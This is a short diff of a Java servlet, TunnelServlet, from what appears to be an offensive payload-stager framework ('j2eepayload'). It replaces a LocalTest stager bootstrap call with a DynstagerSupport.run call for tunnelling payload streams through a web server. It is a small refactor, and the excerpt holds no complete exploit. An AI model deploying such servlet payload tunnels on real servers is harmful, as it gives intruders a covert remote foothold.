@@ -34,14 +34,14 @@
 
 package j2eepayload.servlet;
 
+import j2eepayload.dynstager.DynstagerSupport;
+
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PipedInputStream;
 import java.io.PipedOutputStream;
 import java.net.InetAddress;
-
-import javapayload.stager.LocalTest;
 
 import javax.servlet.ServletException;
 import javax.servlet.ServletOutputStream;
@@ -118,7 +118,7 @@ public class TunnelServlet extends HttpServlet implements PollingHandlerFactory 
 
 		public void run() {
 			try {
-				new LocalTest(in, out).bootstrap(args, false);
+				DynstagerSupport.run(in, out, args);
 			} catch (Exception ex) {
 				exception = ex;
 			}
